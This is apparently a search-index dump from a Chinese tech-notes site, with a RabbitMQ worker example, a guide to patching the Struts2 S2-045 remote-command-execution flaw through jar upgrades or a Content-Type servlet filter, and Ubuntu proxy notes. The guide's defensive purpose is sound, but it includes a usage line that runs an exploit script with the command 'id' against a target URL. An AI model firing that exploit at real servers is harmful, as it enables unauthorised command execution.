7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #!/usr/bin/env python import pika import time import json from config import RMQ_HOST , RMQ_PORT , RMQ_USER , RMQ_PASSWORD QUEUE_NAME = 'add_task_queue' params = pika . ConnectionParameters ( host = RMQ_HOST , port = RMQ_PORT , credentials = pika . credentials . PlainCredentials ( RMQ_USER , RMQ_PASSWORD ) ) connection = pika . BlockingConnection ( params ) channel = connection . channel () channel . queue_declare ( queue = QUEUE_NAME , durable = True ) print ( ' [*] Waiting for messages. To exit press CTRL+C' ) def add ( a , b ): return a + b def save_result ( args , result ): print ( \"save_result for\" , args , \":\" , result ) pass # using mysql or whatever storage... def callback ( ch , method , properties , body ): print ( \" [x] Received %r \" % body ) args = json . loads ( body . decode ()) result = add ( * args ) save_result ( args , result ) print ( \" [x] Done\" ) ch . basic_ack ( delivery_tag = method . delivery_tag ) channel . basic_qos ( prefetch_count = 1 ) channel . basic_consume ( callback , queue = QUEUE_NAME ) channel . start_consuming () \u4ee3\u7801\u6765\u81ea\u5b98\u65b9\u6559\u7a0b\uff1a https://www.rabbitmq.com/tutorials/tutorial-two-python.html","title":"worker.py \u6267\u884c\u4efb\u52a1"},{"location":"S2-045/","text":"\u4fee\u590dStruts2\u7684S2-045\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6700\u8fd1\u6279\u9732\uff0cApache Struts 2\u8f6f\u4ef6\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u9ad8\u5371\u6f0f\u6d1e\uff0cStruts2\u5b98\u65b9\u5df2\u7ecf\u786e\u8ba4\u8be5\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2017-5638\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\u5305\u62ec Struts2.3.5 \u5230 Struts2.3.31 \u4ee5\u53ca Struts2.5 \u5230 Struts2.5.10 \u3002\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7\u6d4f\u89c8\u5668\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5bf9\u53d7\u5f71\u54cd\u7ad9\u70b9\u9020\u6210\u4e25\u91cd\u5f71\u54cd\uff0c\u5f15\u53d1\u6570\u636e\u6cc4\u9732\u3001\u7f51\u9875\u7be1\u6539\u3001\u690d\u5165\u540e\u95e8\u3001\u6210\u4e3a\u8089\u9e21\u7b49\u5b89\u5168\u4e8b\u4ef6\u3002 \u76ee\u524d\uff0cStruts 2\u8f6f\u4ef6\u4f5c\u4e3a\u7f51\u7ad9\u5f00\u53d1\u7684\u5e95\u5c42\u6a21\u677f\u4f7f\u7528\uff0c\u7279\u522b\u662f\u4e92\u52a8\u6027\u8f83\u5f3a\u7684\u7528\u4e8e\u62a5\u540d\u3001\u6ce8\u518c\u3001\u67e5\u8be2\u3001\u7559\u8a00\u7684\u4fe1\u606f\u7cfb\u7edf\uff0c\u6211\u56fd\u5185\u8d85\u8fc7300\u4e07\u5bb6\u653f\u5e9c\u7f51\u7ad9\u53ca\u5176\u5b50\u7ad9\u4f7f\u7528\u4e86Struts\u6846\u67b6\u3002\u9274\u4e8eStruts 2\u5e94\u7528\u5e7f\u6cdb\u3001\u9ed1\u5ba2\u5173\u6ce8\u5ea6\u8f83\u9ad8\u3001\u6f0f\u6d1e\u5371\u5bb3\u8f83\u5927\u3001\u653b\u51fb\u65b9\u5f0f\u7b80\u5355\uff0c\u4e00\u65e6\u88ab\u522b\u6709\u7528\u5fc3\u4eba\u5458\u5229\u7528\uff0c\u53ef\u80fd\u5bf9\u6211\u7f51\u7edc\u5b89\u5168\u9020\u6210\u8f83\u5927\u7684\u5371\u5bb3\u548c\u5f71\u54cd\uff0c\u5efa\u8bae\u5404\u91cd\u8981\u884c\u4e1a\u90e8\u95e8\u53ca\u65f6\u7763\u4fc3\u6838\u67e5\u672c\u90e8\u95e8\u3001\u672c\u884c\u4e1a\u3001\u672c\u8f96\u533a\u7f51\u7ad9\u5b89\u5168\u60c5\u51b5\uff0c\u53ca\u65f6\u5835\u585e\u6f0f\u6d1e\uff0c\u6d88\u9664\u5b89\u5168\u9690\u60a3\uff0c\u63d0\u9ad8\u5b89\u5168\u9632\u8303\u80fd\u529b\uff0c\u5e76\u53ca\u65f6\u4e0a\u62a5\u6838\u67e5\u53ca\u6574\u6539\u60c5\u51b5\u3002 exp \u00b6 \u9996\u5148\u4e22\u4e2aexp\uff0c\u7528\u4e8e\u68c0\u9a8c\u6f0f\u6d1e\u5b58\u5728\u6027\uff1a exp.S2-045.py \u4f7f\u7528\u65b9\u6cd5\u793a\u4f8b\uff1a python exp.S2-045.py http://example.com/example.action \"id\" \u89e3\u51b3\u8fc7\u7a0b \u00b6 \u7ffb\u904d\u4e86\u5b98\u7f51\u548c\u5404\u79cd\u65b0\u95fb\uff0c\u6ca1\u6709\u5207\u5b9e\u53ef\u884c\u7684\u65b9\u6848\uff0c\u4e0b\u8f7d\u5730\u5740\u53ea\u6709\u5b58\u5728\u6f0f\u6d1e\u76842.3.31\u7684\u7248\u672c\uff0c\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848\u90fd\u662f\u7b80\u7565\u7684\u4e00\u53e5\u5347\u7ea7\u52302.3.32\uff0c\u67d0\u4e9b\u64ad\u62a5\u5e73\u53f0&\u5b98\u65b9\u771f\u662fmdzz\uff0c\u5230\u5e95\u662f\u4e3a\u4e86\u4fc3\u8fdb\u6f0f\u6d1e\u4fee\u8865\u8fd8\u662f\u4fc3\u8fdb\u5168\u7f51\u88ab\u9ed1\uff1f \u5b98\u65b9\u53ea\u662f\u7ed9\u4e86\u4e00\u4e2amaven\u7684\u914d\u7f6e\u65b9\u6cd5\uff0c\u5e76\u6ca1\u6709\u76f4\u63a5\u53ef\u4ee5\u4e0b\u8f7d\u7684jar\u6587\u4ef6\u6216zip\u5305 \u53ea\u80fd\u6309\u7167\u5b98\u65b9\u7684\u65b9\u6cd5\u7528maven\u53bb\u5c1d\u8bd5\u6784\u5efa\u4e00\u4e2astruts\u5e94\u7528(\u5feb\u901f\u88c5\u597dmaven\u7684\u65b9\u6cd5\u662f\u4e70\u4e2a\u9999\u6e2f\u7684vps\u7528docker pull maven)\uff0c\u603b\u7b97\u53d1\u73b0\u4e86\u65b0\u7248\u7684jar\u5305\u4e0b\u8f7d\u5730\u5740\uff1a https://repo.maven.apache.org/maven2/org/apache/struts/ \u901a\u8fc7\u4e0b\u8f7d2.3.31\u6838\u5fc3\u5305\u53d1\u73b0\u53ea\u6709 struts2-core \u662f\u9700\u8981\u7684\u3002 \u901a\u8fc7\u5347\u7ea7jar\u5305\u4fee\u590d \u00b6 2.3.x\u7248\u672c\u4fee\u590d\u65b9\u6cd5 \u00b6 \u4e0b\u8f7d2.3.32\u7248\u672c\u7684jar\u6587\u4ef6 https://repo.maven.apache.org/maven2/org/apache/struts/struts2-core/2.3.32/struts2-core-2.3.32.jar \u56fd\u5185CDN\u4e0b\u8f7d\u5730\u5740: https://d.py3.io/struts2-core-2.3.32.jar \u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7528\u7684\u662f2.3.30\u7248\u672c\uff0c\u5219 tomcat\u6240\u5728\u76ee\u5f55/webapps/\u5e94\u7528\u540d\u79f0/WEB-INF/lib \u91cc\u9762\u6709\u4e00\u4e2a struts2-core-2.3.30.jar \u4fee\u590d\u65b9\u6cd5\u5c31\u662f\u2460\u628a\u4e0a\u8ff0\u6587\u4ef6\u5220\u6389(\u81ea\u884c\u5907\u4efd)\uff0c\u2461\u4e0b\u8f7d\u5230\u7684\u65b0\u7248jar\u6587\u4ef6\u6539\u540d\u4e3a\u540c\u540d\u6587\u4ef6\uff0c\u2462\u4e0a\u4f20\u66ff\u6362\uff0c\u2463\u91cd\u542ftomcat\u5373\u53ef Tip: \u66ff\u6362\u540e\u8981\u4fdd\u8bc1\u65e7\u7248\u7684jar\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u4f8b\u5982\u79fb\u5230\u4e0a\u4e00\u7ea7\u76ee\u5f55\uff0c\u4e0d\u8981\u628a\u65e7\u7248\u672c\u7684jar\u6539\u540d\u7559\u5728lib\u76ee\u5f55\u4e0b\uff0c\u5426\u5219\u5c06\u5bfc\u81f4\u8fd9\u4e2awebapp\u65e0\u6cd5\u542f\u52a8 2.5.x\u7248\u672c\u4fee\u590d\u65b9\u6cd5 \u00b6 \u4e0b\u8f7d2.5.10.1\u7248\u672c\u7684jar\u6587\u4ef6 https://repo.maven.apache.org/maven2/org/apache/struts/struts2-core/2.5.10.1/struts2-core-2.5.10.1.jar \u56fd\u5185CDN\u4e0b\u8f7d\u5730\u5740\uff1a https://d.py3.io/struts2-core-2.5.10.1.jar \u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7528\u7684\u662f2.5.10\u7248\u672c\uff0c\u5219 tomcat\u6240\u5728\u76ee\u5f55/webapps/\u5e94\u7528\u540d\u79f0/WEB-INF/lib \u91cc\u9762\u6709\u4e00\u4e2a struts2-core-2.5.10.jar \u4fee\u590d\u65b9\u6cd5\u540c\u4e0a \u901a\u8fc7\u589e\u52a0Filter\u4fee\u590d \u00b6 \u5982\u679c\u4e0d\u65b9\u4fbf\u66ff\u6362jar\u5305\uff0c\u53ef\u4ee5\u901a\u8fc7\u672c\u65b9\u6cd5\u8fdb\u884c\u62e6\u622a\u653b\u51fb\u8bf7\u6c42 \u2460 \u5c06\u4ee5\u4e0bSecurityFilter.java\u6587\u4ef6\u7f16\u8bd1\u6210SecurityFilter.class\uff0c\u6ce8\u610f\u7f16\u8bd1\u4e4b\u524d\u8bbe\u7f6e\u9879\u76ee\u7684\u517c\u5bb9\u6027\u7ea7\u522b\uff0c\u9009\u62e9\u670d\u52a1\u5668\u7248\u672c\u7684jdk\uff0c\u590d\u5236\u5230\u5e94\u7528\u7684WEB-INF/classes\u76ee\u5f55\u4e0b\u3002 import java.io.IOException ; import javax.servlet.Filter ; import javax.servlet.FilterChain ; import javax.servlet.FilterConfig ; import javax.servlet.ServletException ; import javax.servlet.ServletRequest ; import javax.servlet.ServletResponse ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; public class SecurityFilter extends HttpServlet implements Filter { private static final long serialVersionUID = 1L ; public final String www_url_encode = \"application/x-www-form-urlencoded\" ; public final String mul_data = \"multipart/form-data\" ; public final String txt_pla = \"text/plain\" ; public void doFilter ( ServletRequest arg0 , ServletResponse arg1 , FilterChain arg2 ) throws IOException , ServletException { HttpServletRequest request = ( HttpServletRequest ) arg0 ; HttpServletResponse response = ( HttpServletResponse ) arg1 ; String contentType = request . getHeader ( \"Content-Type\" ); if ( contentType != null &&! contentType . equals ( \"\" ) &&! contentType . equalsIgnoreCase ( www_url_encode ) &&! contentType . equalsIgnoreCase ( mul_data ) &&! contentType . equalsIgnoreCase ( txt_pla )){ response . setContentType ( \"text/html;charset=UTF-8\" ); response . getWriter (). write ( \"\u975e\u6cd5\u8bf7\u6c42Content-Type\uff01\" ); return ; } arg2 . doFilter ( request , response ); } public void init ( FilterConfig arg0 ) throws ServletException { } } \u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7684 java -version \u544a\u8bc9\u6211\u4eecjava\u7684\u7248\u672c\u662f1.7\u7684\uff0c\u624b\u91cc\u53c8\u6ca1\u6709\u5f53\u524d\u7f51\u7ad9\u7684\u9879\u76ee\u6587\u4ef6\uff0c\u9700\u8981\u8fd9\u6837\u8fdb\u884c\u7f16\u8bd1\uff1a eclipse\u65b0\u5efa\u4e00\u4e2a\u5de5\u7a0b\uff0c\u65b0\u5efa\u7c7b\u590d\u5236\u4ee5\u4e0a\u4ee3\u7801\uff0c\u9879\u76ee\u5c5e\u6027\u7684 Java Build Path \u4e2d\u7684 Libraries \u6dfb\u52a0tomcat\u4e2d\u7684 servlet-api.jar \uff0c Java Complier \u9875\u9762\u4e2d\u9009\u62e9Complier compliance level\u4e3a1.7 eclipse\u81ea\u52a8\u901a\u8fc7\u7f16\u8bd1\u540e\uff0c\u5373\u53ef\u5c06\u6b64SecurityFilter.class\u6587\u4ef6\u4f20\u81f3\u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7684WEB-INF/classes\u76ee\u5f55\u4e0b\u3002 \u8fd9\u91cc\u6709\u6211\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684class\u6587\u4ef6\uff1a 1.6 1.7 1.8 \u2461 \u5c06\u4e0b\u9762\u7684\u4ee3\u7801\u52a0\u5165WEB-INF/web.xml\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2afilter\u4e4b\u524d\u3002 \u64cd\u4f5c\u4e4b\u524d\u8bf7\u8bb0\u5f97\u5907\u4efd <filter> <filter-name> SecurityFilter </filter-name> <filter-class> SecurityFilter </filter-class> </filter> <filter-mapping> <filter-name> SecurityFilter </filter-name> <url-pattern> /* </url-pattern> </filter-mapping> \u5982\u56fe\u6240\u793a \u2462 \u91cd\u542f\u5e94\u7528\u5373\u53ef \u91cd\u542f\u53ef\u4ee5\u5728tomcat\u7684manager\u9875\u9762Reload\u5e94\u7528\uff0c\u6216\u8005\u76f4\u63a5\u91cd\u542f\u6574\u4e2atomcat \u5982\u679c\u5e94\u7528\u65e0\u6cd5\u542f\u52a8\uff0c\u5728tomcat\u4e0b\u6709logs\u76ee\u5f55\u53ef\u4ee5\u770b\u5230\u4e3a\u5565\u51fa\u9519 \u6d4b\u8bd5\u6548\u679c \u00b6 \u671f\u5f85\u4e00\u4e2a\u66f4\u8d1f\u8d23\u4efb\u7684\u6f0f\u6d1e\u62ab\u9732\u8fc7\u7a0b\uff0c\u671f\u5f85\u4e00\u4e2a\u66f4\u52a0\u5b89\u5168\u7684\u4e92\u8054\u7f51 Author: zjuchenyuan Source: https://py3.io/S2-045.html","title":"S2-045"},{"location":"S2-045/#struts2s2-045","text":"","title":"\u4fee\u590dStruts2\u7684S2-045\u6f0f\u6d1e"},{"location":"S2-045/#_1","text":"\u6700\u8fd1\u6279\u9732\uff0cApache Struts 2\u8f6f\u4ef6\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u9ad8\u5371\u6f0f\u6d1e\uff0cStruts2\u5b98\u65b9\u5df2\u7ecf\u786e\u8ba4\u8be5\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2017-5638\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\u5305\u62ec Struts2.3.5 \u5230 Struts2.3.31 \u4ee5\u53ca Struts2.5 \u5230 Struts2.5.10 \u3002\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7\u6d4f\u89c8\u5668\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5bf9\u53d7\u5f71\u54cd\u7ad9\u70b9\u9020\u6210\u4e25\u91cd\u5f71\u54cd\uff0c\u5f15\u53d1\u6570\u636e\u6cc4\u9732\u3001\u7f51\u9875\u7be1\u6539\u3001\u690d\u5165\u540e\u95e8\u3001\u6210\u4e3a\u8089\u9e21\u7b49\u5b89\u5168\u4e8b\u4ef6\u3002 \u76ee\u524d\uff0cStruts 2\u8f6f\u4ef6\u4f5c\u4e3a\u7f51\u7ad9\u5f00\u53d1\u7684\u5e95\u5c42\u6a21\u677f\u4f7f\u7528\uff0c\u7279\u522b\u662f\u4e92\u52a8\u6027\u8f83\u5f3a\u7684\u7528\u4e8e\u62a5\u540d\u3001\u6ce8\u518c\u3001\u67e5\u8be2\u3001\u7559\u8a00\u7684\u4fe1\u606f\u7cfb\u7edf\uff0c\u6211\u56fd\u5185\u8d85\u8fc7300\u4e07\u5bb6\u653f\u5e9c\u7f51\u7ad9\u53ca\u5176\u5b50\u7ad9\u4f7f\u7528\u4e86Struts\u6846\u67b6\u3002\u9274\u4e8eStruts 2\u5e94\u7528\u5e7f\u6cdb\u3001\u9ed1\u5ba2\u5173\u6ce8\u5ea6\u8f83\u9ad8\u3001\u6f0f\u6d1e\u5371\u5bb3\u8f83\u5927\u3001\u653b\u51fb\u65b9\u5f0f\u7b80\u5355\uff0c\u4e00\u65e6\u88ab\u522b\u6709\u7528\u5fc3\u4eba\u5458\u5229\u7528\uff0c\u53ef\u80fd\u5bf9\u6211\u7f51\u7edc\u5b89\u5168\u9020\u6210\u8f83\u5927\u7684\u5371\u5bb3\u548c\u5f71\u54cd\uff0c\u5efa\u8bae\u5404\u91cd\u8981\u884c\u4e1a\u90e8\u95e8\u53ca\u65f6\u7763\u4fc3\u6838\u67e5\u672c\u90e8\u95e8\u3001\u672c\u884c\u4e1a\u3001\u672c\u8f96\u533a\u7f51\u7ad9\u5b89\u5168\u60c5\u51b5\uff0c\u53ca\u65f6\u5835\u585e\u6f0f\u6d1e\uff0c\u6d88\u9664\u5b89\u5168\u9690\u60a3\uff0c\u63d0\u9ad8\u5b89\u5168\u9632\u8303\u80fd\u529b\uff0c\u5e76\u53ca\u65f6\u4e0a\u62a5\u6838\u67e5\u53ca\u6574\u6539\u60c5\u51b5\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"S2-045/#exp","text":"\u9996\u5148\u4e22\u4e2aexp\uff0c\u7528\u4e8e\u68c0\u9a8c\u6f0f\u6d1e\u5b58\u5728\u6027\uff1a exp.S2-045.py \u4f7f\u7528\u65b9\u6cd5\u793a\u4f8b\uff1a python exp.S2-045.py http://example.com/example.action \"id\"","title":"exp"},{"location":"S2-045/#_2","text":"\u7ffb\u904d\u4e86\u5b98\u7f51\u548c\u5404\u79cd\u65b0\u95fb\uff0c\u6ca1\u6709\u5207\u5b9e\u53ef\u884c\u7684\u65b9\u6848\uff0c\u4e0b\u8f7d\u5730\u5740\u53ea\u6709\u5b58\u5728\u6f0f\u6d1e\u76842.3.31\u7684\u7248\u672c\uff0c\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848\u90fd\u662f\u7b80\u7565\u7684\u4e00\u53e5\u5347\u7ea7\u52302.3.32\uff0c\u67d0\u4e9b\u64ad\u62a5\u5e73\u53f0&\u5b98\u65b9\u771f\u662fmdzz\uff0c\u5230\u5e95\u662f\u4e3a\u4e86\u4fc3\u8fdb\u6f0f\u6d1e\u4fee\u8865\u8fd8\u662f\u4fc3\u8fdb\u5168\u7f51\u88ab\u9ed1\uff1f \u5b98\u65b9\u53ea\u662f\u7ed9\u4e86\u4e00\u4e2amaven\u7684\u914d\u7f6e\u65b9\u6cd5\uff0c\u5e76\u6ca1\u6709\u76f4\u63a5\u53ef\u4ee5\u4e0b\u8f7d\u7684jar\u6587\u4ef6\u6216zip\u5305 \u53ea\u80fd\u6309\u7167\u5b98\u65b9\u7684\u65b9\u6cd5\u7528maven\u53bb\u5c1d\u8bd5\u6784\u5efa\u4e00\u4e2astruts\u5e94\u7528(\u5feb\u901f\u88c5\u597dmaven\u7684\u65b9\u6cd5\u662f\u4e70\u4e2a\u9999\u6e2f\u7684vps\u7528docker pull maven)\uff0c\u603b\u7b97\u53d1\u73b0\u4e86\u65b0\u7248\u7684jar\u5305\u4e0b\u8f7d\u5730\u5740\uff1a https://repo.maven.apache.org/maven2/org/apache/struts/ \u901a\u8fc7\u4e0b\u8f7d2.3.31\u6838\u5fc3\u5305\u53d1\u73b0\u53ea\u6709 struts2-core \u662f\u9700\u8981\u7684\u3002","title":"\u89e3\u51b3\u8fc7\u7a0b"},{"location":"S2-045/#jar","text":"","title":"\u901a\u8fc7\u5347\u7ea7jar\u5305\u4fee\u590d"},{"location":"S2-045/#23x","text":"\u4e0b\u8f7d2.3.32\u7248\u672c\u7684jar\u6587\u4ef6 https://repo.maven.apache.org/maven2/org/apache/struts/struts2-core/2.3.32/struts2-core-2.3.32.jar \u56fd\u5185CDN\u4e0b\u8f7d\u5730\u5740: https://d.py3.io/struts2-core-2.3.32.jar \u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7528\u7684\u662f2.3.30\u7248\u672c\uff0c\u5219 tomcat\u6240\u5728\u76ee\u5f55/webapps/\u5e94\u7528\u540d\u79f0/WEB-INF/lib \u91cc\u9762\u6709\u4e00\u4e2a struts2-core-2.3.30.jar \u4fee\u590d\u65b9\u6cd5\u5c31\u662f\u2460\u628a\u4e0a\u8ff0\u6587\u4ef6\u5220\u6389(\u81ea\u884c\u5907\u4efd)\uff0c\u2461\u4e0b\u8f7d\u5230\u7684\u65b0\u7248jar\u6587\u4ef6\u6539\u540d\u4e3a\u540c\u540d\u6587\u4ef6\uff0c\u2462\u4e0a\u4f20\u66ff\u6362\uff0c\u2463\u91cd\u542ftomcat\u5373\u53ef Tip: \u66ff\u6362\u540e\u8981\u4fdd\u8bc1\u65e7\u7248\u7684jar\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u4f8b\u5982\u79fb\u5230\u4e0a\u4e00\u7ea7\u76ee\u5f55\uff0c\u4e0d\u8981\u628a\u65e7\u7248\u672c\u7684jar\u6539\u540d\u7559\u5728lib\u76ee\u5f55\u4e0b\uff0c\u5426\u5219\u5c06\u5bfc\u81f4\u8fd9\u4e2awebapp\u65e0\u6cd5\u542f\u52a8","title":"2.3.x\u7248\u672c\u4fee\u590d\u65b9\u6cd5"},{"location":"S2-045/#25x","text":"\u4e0b\u8f7d2.5.10.1\u7248\u672c\u7684jar\u6587\u4ef6 https://repo.maven.apache.org/maven2/org/apache/struts/struts2-core/2.5.10.1/struts2-core-2.5.10.1.jar \u56fd\u5185CDN\u4e0b\u8f7d\u5730\u5740\uff1a https://d.py3.io/struts2-core-2.5.10.1.jar \u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7528\u7684\u662f2.5.10\u7248\u672c\uff0c\u5219 tomcat\u6240\u5728\u76ee\u5f55/webapps/\u5e94\u7528\u540d\u79f0/WEB-INF/lib \u91cc\u9762\u6709\u4e00\u4e2a struts2-core-2.5.10.jar \u4fee\u590d\u65b9\u6cd5\u540c\u4e0a","title":"2.5.x\u7248\u672c\u4fee\u590d\u65b9\u6cd5"},{"location":"S2-045/#filter","text":"\u5982\u679c\u4e0d\u65b9\u4fbf\u66ff\u6362jar\u5305\uff0c\u53ef\u4ee5\u901a\u8fc7\u672c\u65b9\u6cd5\u8fdb\u884c\u62e6\u622a\u653b\u51fb\u8bf7\u6c42 \u2460 \u5c06\u4ee5\u4e0bSecurityFilter.java\u6587\u4ef6\u7f16\u8bd1\u6210SecurityFilter.class\uff0c\u6ce8\u610f\u7f16\u8bd1\u4e4b\u524d\u8bbe\u7f6e\u9879\u76ee\u7684\u517c\u5bb9\u6027\u7ea7\u522b\uff0c\u9009\u62e9\u670d\u52a1\u5668\u7248\u672c\u7684jdk\uff0c\u590d\u5236\u5230\u5e94\u7528\u7684WEB-INF/classes\u76ee\u5f55\u4e0b\u3002 import java.io.IOException ; import javax.servlet.Filter ; import javax.servlet.FilterChain ; import javax.servlet.FilterConfig ; import javax.servlet.ServletException ; import javax.servlet.ServletRequest ; import javax.servlet.ServletResponse ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; public class SecurityFilter extends HttpServlet implements Filter { private static final long serialVersionUID = 1L ; public final String www_url_encode = \"application/x-www-form-urlencoded\" ; public final String mul_data = \"multipart/form-data\" ; public final String txt_pla = \"text/plain\" ; public void doFilter ( ServletRequest arg0 , ServletResponse arg1 , FilterChain arg2 ) throws IOException , ServletException { HttpServletRequest request = ( HttpServletRequest ) arg0 ; HttpServletResponse response = ( HttpServletResponse ) arg1 ; String contentType = request . getHeader ( \"Content-Type\" ); if ( contentType != null &&! contentType . equals ( \"\" ) &&! contentType . equalsIgnoreCase ( www_url_encode ) &&! contentType . equalsIgnoreCase ( mul_data ) &&! contentType . equalsIgnoreCase ( txt_pla )){ response . setContentType ( \"text/html;charset=UTF-8\" ); response . getWriter (). write ( \"\u975e\u6cd5\u8bf7\u6c42Content-Type\uff01\" ); return ; } arg2 . doFilter ( request , response ); } public void init ( FilterConfig arg0 ) throws ServletException { } } \u5047\u8bbe\u670d\u52a1\u5668\u4e0a\u7684 java -version \u544a\u8bc9\u6211\u4eecjava\u7684\u7248\u672c\u662f1.7\u7684\uff0c\u624b\u91cc\u53c8\u6ca1\u6709\u5f53\u524d\u7f51\u7ad9\u7684\u9879\u76ee\u6587\u4ef6\uff0c\u9700\u8981\u8fd9\u6837\u8fdb\u884c\u7f16\u8bd1\uff1a eclipse\u65b0\u5efa\u4e00\u4e2a\u5de5\u7a0b\uff0c\u65b0\u5efa\u7c7b\u590d\u5236\u4ee5\u4e0a\u4ee3\u7801\uff0c\u9879\u76ee\u5c5e\u6027\u7684 Java Build Path \u4e2d\u7684 Libraries \u6dfb\u52a0tomcat\u4e2d\u7684 servlet-api.jar \uff0c Java Complier \u9875\u9762\u4e2d\u9009\u62e9Complier compliance level\u4e3a1.7 eclipse\u81ea\u52a8\u901a\u8fc7\u7f16\u8bd1\u540e\uff0c\u5373\u53ef\u5c06\u6b64SecurityFilter.class\u6587\u4ef6\u4f20\u81f3\u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7684WEB-INF/classes\u76ee\u5f55\u4e0b\u3002 \u8fd9\u91cc\u6709\u6211\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684class\u6587\u4ef6\uff1a 1.6 1.7 1.8 \u2461 \u5c06\u4e0b\u9762\u7684\u4ee3\u7801\u52a0\u5165WEB-INF/web.xml\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2afilter\u4e4b\u524d\u3002 \u64cd\u4f5c\u4e4b\u524d\u8bf7\u8bb0\u5f97\u5907\u4efd <filter> <filter-name> SecurityFilter </filter-name> <filter-class> SecurityFilter </filter-class> </filter> <filter-mapping> <filter-name> SecurityFilter </filter-name> <url-pattern> /* </url-pattern> </filter-mapping> \u5982\u56fe\u6240\u793a \u2462 \u91cd\u542f\u5e94\u7528\u5373\u53ef \u91cd\u542f\u53ef\u4ee5\u5728tomcat\u7684manager\u9875\u9762Reload\u5e94\u7528\uff0c\u6216\u8005\u76f4\u63a5\u91cd\u542f\u6574\u4e2atomcat \u5982\u679c\u5e94\u7528\u65e0\u6cd5\u542f\u52a8\uff0c\u5728tomcat\u4e0b\u6709logs\u76ee\u5f55\u53ef\u4ee5\u770b\u5230\u4e3a\u5565\u51fa\u9519","title":"\u901a\u8fc7\u589e\u52a0Filter\u4fee\u590d"},{"location":"S2-045/#_3","text":"\u671f\u5f85\u4e00\u4e2a\u66f4\u8d1f\u8d23\u4efb\u7684\u6f0f\u6d1e\u62ab\u9732\u8fc7\u7a0b\uff0c\u671f\u5f85\u4e00\u4e2a\u66f4\u52a0\u5b89\u5168\u7684\u4e92\u8054\u7f51 Author: zjuchenyuan Source: https://py3.io/S2-045.html","title":"\u6d4b\u8bd5\u6548\u679c"},{"location":"Ubuntu/","text":"Ubuntu\u684c\u9762\u7248\u4f7f\u7528 \u00b6 \u4f7f\u7528ubuntu16.04\u684c\u9762\u7248\u7684\u4e00\u4e9b\u6298\u817e \u5b89\u88c5Google\u62fc\u97f3\u5e76\u914d\u7f6e\u4ee3\u7406 \u00b6 \u5b89\u88c5\u8bf7\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0-ubuntu\u5b89\u88c5\u8c37\u6b4c\u62fc\u97f3\u8f93\u5165\u6cd5 \u5176\u4e2d\u5728 im-config \u5207\u6362\u4e3a fcitx \u540e\uff0c\u65e0\u9700\u91cd\u542f\uff0c\u53ea\u9700\u8981\u6ce8\u9500\u540e\u518d\u6b21\u767b\u5f55\u5373\u53ef\uff08\u6ce8\u9500\u4e0d\u4f1a\u5f71\u54cdscreen\u4e2d\u7684\u4efb\u52a1\uff09 \u5b89\u88c5\u540e\u6700\u4e3a\u6709\u7528\u7684\u4e91\u5019\u9009\u529f\u80fd\u7531\u4e8e\u9700\u8981\u914d\u7f6e\u4ee3\u7406\u624d\u80fd\u7528\uff0c\u914d\u7f6e\u65b9\u6cd5\uff1a \u6253\u5f00\u4e00\u4e2aterminal\uff08\u5efa\u8bae\u542f\u52a8\u4e00\u4e2ascreen\uff09\uff0c\u914d\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u7136\u540e\u91cd\u542ffcitx\uff1a export http_proxy = \"http://127.0.0.1:8118\" export https_proxy = \"http://127.0.0.1:8118\" fcitx - r","title":"Ubuntu"},{"location":"Ubuntu/#ubuntu","text":"\u4f7f\u7528ubuntu16.04\u684c\u9762\u7248\u7684\u4e00\u4e9b\u6298\u817e","title":"Ubuntu\u684c\u9762\u7248\u4f7f\u7528"},{"location":"Ubuntu/#google","text":"\u5b89\u88c5\u8bf7\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0-ubuntu\u5b89\u88c5\u8c37\u6b4c\u62fc\u97f3\u8f93\u5165\u6cd5 \u5176\u4e2d\u5728 im-config \u5207\u6362\u4e3a fcitx \u540e\uff0c\u65e0\u9700\u91cd\u542f\uff0c\u53ea\u9700\u8981\u6ce8\u9500\u540e\u518d\u6b21\u767b\u5f55\u5373\u53ef\uff08\u6ce8\u9500\u4e0d\u4f1a\u5f71\u54cdscreen\u4e2d\u7684\u4efb\u52a1\uff09 